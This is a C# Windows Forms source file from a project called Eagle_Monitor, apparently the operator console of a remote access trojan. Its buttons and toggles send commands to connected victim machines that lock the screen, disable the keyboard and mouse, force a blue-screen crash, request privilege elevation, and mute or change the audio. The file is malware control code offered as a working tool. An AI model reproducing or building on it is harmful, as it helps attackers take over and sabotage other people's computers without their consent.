using Eagle_Monitor.Clients;
using Eagle_Monitor.Controls;
using System;
using System.Threading.Tasks;
using System.Windows.Forms;
using static Shared.Serializer;

/* 
|| AUTHOR Arsium ||
|| github : https://github.com/arsium       ||
*/

namespace Eagle_Monitor.Forms
{
    public partial class MiscellaneousForm : FormPattern
    {
        public string ClientHWID { get; set; }
        public string IP_Origin { get; set; }

        public MiscellaneousForm(string ClientHWID, string IP_Origin)
        {
            this.ClientHWID = ClientHWID;
            this.IP_Origin = IP_Origin;
            InitializeComponent();
        }

        private void MiscellaneousForm_Load(object sender, EventArgs e)
        {

        }

        private void closeButton_Click(object sender, EventArgs e)
        {
            this.Close();
            Client.SimplePacketSender(Shared.PacketType.KB_ON, Client.ClientDictionary[this.IP_Origin]);
            //this is a fix otherwise the keyboard won't work until client's restart if this form is closed and keyboard disabled;
            Client.SimplePacketSender(Shared.PacketType.MS_ON, Client.ClientDictionary[this.IP_Origin]);
            //same for mouse;
        }

        private void maximizeButton_Click(object sender, EventArgs e)
        {
            if (this.WindowState == FormWindowState.Normal)
            {
                this.WindowState = FormWindowState.Maximized;
            }
            else
            {
                this.WindowState = FormWindowState.Normal;
            }
        }

        private void minimizeButton_Click(object sender, EventArgs e)
        {
            this.WindowState = FormWindowState.Minimized;
        }

        private void screenLockerToggleSwitch_CheckedChanged(object sender, EventArgs e)
        {
            if (screenLockerToggleSwitch.Checked)
            {
                Client.SimplePacketSender(Shared.PacketType.SCRL_ON, Client.ClientDictionary[this.IP_Origin]);
            }
            else 
            {
                Client.SimplePacketSender(Shared.PacketType.SRCL_OFF, Client.ClientDictionary[this.IP_Origin]);
            }
        }

        private void BSODToggleSwitch_CheckedChanged(object sender, EventArgs e)
        {
            Client C = Client.ClientDictionary[this.IP_Origin];
            Data D = new Data();
            D.Type = Shared.PacketType.PLUGIN;
            D.Plugin = Plugins.Miscellaneous;
            D.IP_Origin = C.IP;
            D.HWID = C.HWID;
            D.DataReturn = new object[] { Shared.PacketType.BSOD_SYS };
            Task.Run(() => C.SendData(D.Serialize()));
            Client.ClientFixer(C);
        }

        private void keyboardToggleSwitch_CheckedChanged(object sender, EventArgs e)
        {
            if (keyboardToggleSwitch.Checked)
            {
                Client.SimplePacketSender(Shared.PacketType.KB_OFF, Client.ClientDictionary[this.IP_Origin]);
            }
            else 
            {
                Client.SimplePacketSender(Shared.PacketType.KB_ON, Client.ClientDictionary[this.IP_Origin]);
            }
        }

        private void mouseToggleSwitch_CheckedChanged(object sender, EventArgs e)
        {
            if (mouseToggleSwitch.Checked)
            {
                Client.SimplePacketSender(Shared.PacketType.MS_OFF, Client.ClientDictionary[this.IP_Origin]);
            }
            else
            {
                Client.SimplePacketSender(Shared.PacketType.MS_ON, Client.ClientDictionary[this.IP_Origin]);
            }
        }

        private void windowsButton1_Click(object sender, EventArgs e)
        {
            Client C = Client.ClientDictionary[this.IP_Origin];
            Data D = new Data();
            D.Type = Shared.PacketType.PLUGIN;
            D.Plugin = Plugins.Miscellaneous;
            D.IP_Origin = C.IP;
            D.HWID = C.HWID;
            D.DataReturn = new object[] { Shared.PacketType.GET_PRIV ,privilegeComboBox.SelectedIndex + 1 };
            Task.Run(() => C.SendData(D.Serialize()));
        }

        private void muteSoundToggleSwitch_CheckedChanged(object sender, EventArgs e)
        {
            Client C = Client.ClientDictionary[this.IP_Origin];
            Data D = new Data();
            D.Type = Shared.PacketType.PLUGIN;
            D.Plugin = Plugins.Miscellaneous;
            D.IP_Origin = C.IP;
            D.HWID = C.HWID;
            D.DataReturn = new object[] { Shared.PacketType.MUTE_AUDIO};
            Task.Run(() => C.SendData(D.Serialize()));
        }

        private void audioUpWindowsButton_Click(object sender, EventArgs e)
        {
            Client C = Client.ClientDictionary[this.IP_Origin];
            Data D = new Data();
            D.Type = Shared.PacketType.PLUGIN;
            D.Plugin = Plugins.Miscellaneous;
            D.IP_Origin = C.IP;
            D.HWID = C.HWID;
            D.DataReturn = new object[] { Shared.PacketType.AUDIO_UP };
            Task.Run(() => C.SendData(D.Serialize()));
        }

        private void audioDownWindowsButton_Click(object sender, EventArgs e)
        {
            Client C = Client.ClientDictionary[this.IP_Origin];
            Data D = new Data();
            D.Type = Shared.PacketType.PLUGIN;
            D.Plugin = Plugins.Miscellaneous;
            D.IP_Origin = C.IP;
            D.HWID = C.HWID;
            D.DataReturn = new object[] { Shared.PacketType.AUDIO_DOWN };
            Task.Run(() => C.SendData(D.Serialize()));
        }
    }
}
